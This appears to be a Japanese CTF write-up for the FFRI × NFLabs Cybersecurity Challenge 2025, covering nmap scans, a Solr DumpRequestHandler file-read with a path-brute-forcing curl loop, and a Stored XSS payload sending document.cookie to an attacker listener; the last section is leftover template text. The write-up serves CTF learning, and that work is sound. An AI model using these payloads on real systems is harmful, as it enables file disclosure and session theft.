---
title: "FFRI × NFLabs. Cybersecurity Challenge 2025 Writeup & Upsolve"
date: 2025-09-15
---

# FFRI × NFLabs. Cybersecurity Challenge 2025 Writeup

FFRI × NFLabs. Cybersecurity Challenge 2025 に参加し、結果は **13位** でした。<br>
Top10入りを目標にしていたので悔しい……。

![ranking](/src/content/image/FFRI_NFLabs_ranking.png)

## Welcome [ 1/1 ]

### Welcome [175pt / 66 solves]
提出のみ。

```
flag{Good_Luck_and_Have_Fun!}
```

---

## Pentest [ 3/7 ]

### HiddenService [255pt / 50 solves]

`nmap` で 22/tcp (ssh)、31337/tcp (Apache) を確認。

```bash
$ nmap 10.0.129.138 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 16:51 JST
Nmap scan report for ip-10-0-129-138.ap-northeast-1.compute.internal (10.0.129.138)
Host is up (0.0017s latency).
Not shown: 998 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
31337/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds
```

31337 番にアクセスすると簡易シェルに入れたため、`ls`/`cat` で探索して `flag.txt` を取得。

![Hidden_result](/src/content/image/Hidden_result.png)

```
flag{Ch4nging_th3_p0rt_is_p0intl3ss}
```

---

### Shell4Solr [455pt / 16 solves]

`nmap` で 80/tcp (Apache Solr)、2222/tcp (ssh) を確認。80 番は **Apache Solr 8.11.0** の管理画面。

```bash
$ nmap 10.0.129.148 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 17:19 JST
Nmap scan report for ip-10-0-129-148.ap-northeast-1.compute.internal (10.0.129.148)
Host is up (0.0017s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache Solr
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds
```

ログ画面（`/admin/info/logging`）に **`authentication=disabled, authorization=disabled`** と表示。
![warn](/src/content/image/Solr_warn.png)
Solr にはデバッグ用途の **DumpRequestHandler** があり、`ContentStreams (stream.*)` をそのまま返すため、認証なしで開いていれば **LFI** が狙えると判断。
まずは `/etc/passwd` を読めるか検証：

```bash
curl -s "http://10.0.129.128:80/solr/$CORE/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd"
```

<details>
<summary><b>レスポンス（抜粋・JSON）</b></summary>

```json
{
  "responseHeader": { "status": 0, "handler": "org.apache.solr.handler.DumpRequestHandler" },
  "params": { "stream.url": "file:///etc/passwd", "param": "ContentStreams" },
  "streams": [
    {
      "sourceInfo": "url",
      "stream": "root:x:0:0:root:/root:/bin/ash\n...snip...\nsolr:x:1000:1000:Linux User,,,:/opt/solr:/bin/ash\n"
    }
  ]
}
```
</details>

`HOME=/opt/solr`, `PWD=/opt/solr/server` などから flag の置き場所を当たり、いくつかの典型パスを総当たり。

```bash
CORE=${CORE:-core0}
BASE="http://10.0.129.128:80/solr/$CORE/debug/dump?param=ContentStreams&stream.url=file://"

for p in \
  /etc/flag /etc/flag.txt \
  /opt/flag /opt/flag.txt \
  /var/flag /var/flag.txt \
  /opt/solr/flag /opt/solr/flag.txt \
  /opt/solr/server/flag /opt/solr/server/flag.txt \
  /opt/solr/server/solr/flag /opt/solr/server/solr/flag.txt \
  /var/solr/flag /var/solr/flag.txt \
  /run/secrets/flag /run/secrets/flag.txt /run/secrets/FLAG \
  /etc/motd /etc/issue /etc/hostname
do
  echo "=== $p"
  curl -s "${BASE}$p"
  echo
done
```

`/opt/solr/server/flag.txt` でヒット：

<details>
<summary><b>レスポンス（JSON）</b></summary>

```json
{
  "responseHeader": { "status": 0 },
  "params": { "stream.url": "file:///opt/solr/server/flag.txt" },
  "streams": [
    { "sourceInfo": "url", "stream": "flag{l0g4j_s0lr_r3vshell}" }
  ],
  "context": { "path": "/debug/dump", "httpMethod": "GET" }
}
```
</details>

```
flag{l0g4j_s0lr_r3vshell}
```

> 余談：当初は Log4Shell の RCE PoC を試したがJDK17でビルドがうまくいかず、GPTに聞きながら1時間くらい格闘してました

---

## Web [ 3/4 ]
### Secure Web Company [300pt / 41 solves]
Dockerfileを見るとREADME.mdが公開されていた。
```Dockerfile
FROM nginx:alpine
COPY index.html script.js style.css README.md /usr/share/nginx/html/
```
```bash
$ curl http://10.0.129.147:8090/README.md 
# 開発者向け

## 管理画面認証情報

- ユーザー名: admin
- パスワード: flag{5up3r53cr37_4dm1n_p455w0rd}
```
```
flag{5up3r53cr37_4dm1n_p455w0rd}
```

### Timecard [380pt / 25 solves]
問題文を読んで、managerのアカウントが1分に1回申請を承認するようになっていたのでStored XSSを使う問題なのかとなぁと思いながら問題を解き始めた。案の定app.pyを見ると、`HttpOnly=false`となっていた。
加えてmanager側の`manager_dashboard.html.js`で`{{ remarks }}`をそのままhtmlとして解釈できるようになっていた。
```PY
app.config['SESSION_COOKIE_HTTPONLY'] = False
app.config['SECRET_KEY'] = SECRET_KEY
app.config['SQLALCHEMY_DATABASE_URI'] = f"mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}"
```
```html
    <ul>
        {% for timecard in timecards %}
            <li>
                {{ timecard.date }}: {{ timecard.start_time }} - {{ timecard.end_time }} ({{ timecard.remarks }})
                <!-- 状態表示 -->
                {% if timecard.cancel_requested %}
                    - <span style="color:orange;">取り消し申請中</span>
                    <form action="{{ url_for('approve_timecard', timecard_id=timecard.id) }}" method="post" style="display:inline;">
                        <button type="submit">取り消し申請承認</button>
                    </form>
                {% elif timecard.approved %}
                    - <span style="color:green;">承認済み</span>
                {% else %}
                    - <span style="color:red;">未承認</span>
                    <form action="{{ url_for('approve_timecard', timecard_id=timecard.id) }}" method="post" style="display:inline;">
                        <button type="submit">承認</button>
                    </form>
                {% endif %}
            </li>
        {% endfor %}
    </ul>
```
これを使ってStored XSSを行う。managerが1分に1回承認しに来るので、そこに`document.cookie`を仕込むことでmanagerのsessionを奪う。まずは待ち受けを立てる
```PY
python3 -m http.server 8000
```
後はremarksの部分にStored XSSを仕込む
```
<img src=x onerror="new Image().src='http://10.0.0.49:8000/?c='+encodeURIComponent(document.cookie)">
```
するとmanagerからのcookieがStored XSSによって窃取できたので、それを自身のcookieにセットする。それでflagが得られた。
```
flag{H9aDSMkTCWZMEuk25nZw}
```

## Malware Analysis [ 2/4 ]
### Downloader
（省略）

## Binary [ 2/4 ]
### Abnormal
（省略）

## Misc [ 3/4 ]
### Bellaso

```js
const hello = () => {
  console.log("Hello, World!");
};
```

> 引用テキストの例です。

[リンクの例](https://example.com)

**太字**や*斜体*のテキストも使用できます。
